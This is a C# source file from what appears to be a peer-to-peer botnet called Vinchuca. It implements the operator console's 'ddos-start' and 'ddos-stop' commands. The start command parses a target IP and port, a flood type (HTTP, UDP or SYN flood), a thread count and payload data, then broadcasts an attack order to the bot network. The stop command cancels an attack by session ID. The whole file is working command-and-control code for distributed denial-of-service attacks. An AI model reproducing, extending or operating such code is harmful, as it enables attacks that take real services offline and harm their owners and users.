using System;
using System.Collections.Generic;
using System.Net;
using System.Text;
using Mono.Options;
using Vinchuca;
using Vinchuca.Network.Protocol.Messages.Command;

namespace REPL.Commands
{
    class DDoSStartCommand : Command
    {
        private readonly Agent _agent;
        private readonly CommandLineReader _repl;

        public bool ShowHelp { get; set; }
        public string Target { get; set; }
        public string Type { get; set; }
        public string Threads { get; set; }
        public string Buffer { get; set; }

        public DDoSStartCommand(Agent agent, CommandLineReader repl)
            : base("ddos-start", "Perform DDOS attack against specified target.")
        {
            _agent = agent;
            _repl = repl;
            Options = new OptionSet() {
                "usage: ddos-start --type:attack-type --target:ipaddress:port",
                "",
                "Performs a DDoS attack against the specified target ip:port endpoint.",
                "eg: ddos --type:httpflood --target:212.54.13.87:80 --threads:3",
                { "type=",   "{type} of attack [httpflood | udpflood | synflood].", x => Type = x },
                { "target=", "{target} to attack (ipaddress:port endpoint)", x => Target = x },
                { "threads=", "number of {threads} used in the attack (default: 4)", x => Threads = x },
                { "data=", "{data} to send in httpflood or updflood", x=> Buffer = x },
                { "help|h|?","Show this message and exit.", v => ShowHelp = v != null },
            };
            _repl.AddAutocompletionWords("ddos-start", "--type", "--target", "synflood", "udpflood", "httpflood");
        }

        public override int Invoke(IEnumerable<string> args)
        {
            try
            {
                var extra = Options.Parse(args);
                if (ShowHelp)
                {
                    Options.WriteOptionDescriptions(CommandSet.Out);
                    return 0;
                }
                if (string.IsNullOrEmpty(Target))
                {
                    Console.WriteLine("commands: Missing required argument `--target=TARGET`.");
                    Console.WriteLine("commands: Use `help ddos-start` for details.");
                    return 1;
                }
                if (string.IsNullOrEmpty(Type))
                {
                    Console.WriteLine("commands: Missing required argument `--typet=TYPE`.");
                    Console.WriteLine("commands: Use `help ddos-start` for details.");
                    return 1;
                }

                DosType type;
                switch (Type)
                {
                    case "httpflood":
                        type = DosType.HttpFlood;
                        break;
                    case "synflood":
                        type = DosType.SynFlood;
                        break;
                    case "udpflood":
                        type= DosType.UdpFlood;
                        break;
                    default:
                        Console.WriteLine("commands: Invalid attack type.");
                        Console.WriteLine("commands: Use `help ddos-start` for details.");
                        return 1;
                }
                var endpointParts = Target.Split(':');
                var ip = endpointParts[0];
                var port = int.Parse(endpointParts[1]);
                var session = (ulong) Vinchuca.Utils.RandomUtils.NextCorrelationId();
                var ddosMessage = new DosAttackMessage()
                {
                    AttackId = session,
                    Type = type,
                    Threads = short.Parse(Threads),
                    Target = new IPEndPoint(IPAddress.Parse(ip), port),
                    Buffer = Encoding.ASCII.GetBytes(Buffer)
                };
                _agent.MessagesManager.Broadcast(ddosMessage, 6);
                Console.WriteLine($"Attack sessionID {session}");
                Console.WriteLine($"Stop it using ´ddos-stop {session}´");
                _repl.AddAutocompletionWords(session.ToString());
                return 0;
            }
            catch (Exception e)
            {
                //_repl.Console.WriteLine("commands: {0}", CommandDemo.Verbosity >= 1 ? e.ToString() : e.Message);
                return 1;
            }
        }
    }

    class DDoSStopCommand : Command
    {
        private readonly Agent _agent;
        private readonly CommandLineReader _repl;

        public bool ShowHelp { get; set; }
        public string Target { get; set; }
        public string Type { get; set; }

        public DDoSStopCommand(Agent agent, CommandLineReader repl)
            : base("ddos-stop", "Stops an ongoing DDOS attack.")
        {
            _agent = agent;
            _repl = repl;
            Options = new OptionSet() {
                "usage: ddos-stop sessionid",
                "",
                "Stops an ongoing DDOS attack identified by its sessionid",
                "eg: ddos-stop 2343256490123552",
                { "help|h|?","Show this message and exit.", v => ShowHelp = v != null },
            };
            _repl.AddAutocompletionWords("ddos-stop");
        }

        public override int Invoke(IEnumerable<string> args)
        {
            try
            {
                var extra = Options.Parse(args);
                if (ShowHelp)
                {
                    Options.WriteOptionDescriptions(CommandSet.Out);
                    return 0;
                }
                if (extra.Count == 0)
                {
                    Console.WriteLine("commands: Missing required argument `SESSIONID`.");
                    Console.WriteLine("commands: Use `help ddos-stop` for details.");
                    return 1;
                }
                var session = ulong.Parse(extra[0]);
                var ddosStopMessage = new DosStopAttackMessage()
                {
                    AttackId = session
                };
                _agent.MessagesManager.Broadcast(ddosStopMessage, 6);
                Console.WriteLine("stopping attack....");
                return 0;
            }
            catch (Exception e)
            {
                //_repl.Console.WriteLine("commands: {0}", CommandDemo.Verbosity >= 1 ? e.ToString() : e.Message);
                return 1;
            }
        }
    }

}
